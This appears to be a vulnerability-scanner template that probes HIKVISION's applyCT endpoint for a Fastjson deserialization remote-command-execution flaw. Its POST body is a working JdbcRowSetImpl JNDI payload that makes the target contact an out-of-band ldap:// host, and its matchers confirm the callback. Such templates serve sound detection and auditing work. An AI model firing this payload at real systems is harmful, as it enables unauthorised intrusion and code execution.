id: hikvision-fastjson-rce
brief:
    title: HIKVISION applyCT Fastjson - Remote Command Execution
    by: SleepingBag945
    level: critical
    about: The HIKVISION comprehensive security management platform applyCT has a remote command execution vulnerability in a low version of Fastjson, through which an attacker can execute arbitrary commands ...
    label:
        - hikvision
        - fastjson
        - rce
        - oast
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/bic/ssoService/v1/applyCT'
      head:
        Content-Type: application/json
      body: '{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true},"hfe4zyyzldp":"="}'
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
        - "on": word
          has:
            - '"code":'
            - '"msg":'
          in: body
          need: all
        - "on": word
          has:
            - text/json
          in: header
          need: all
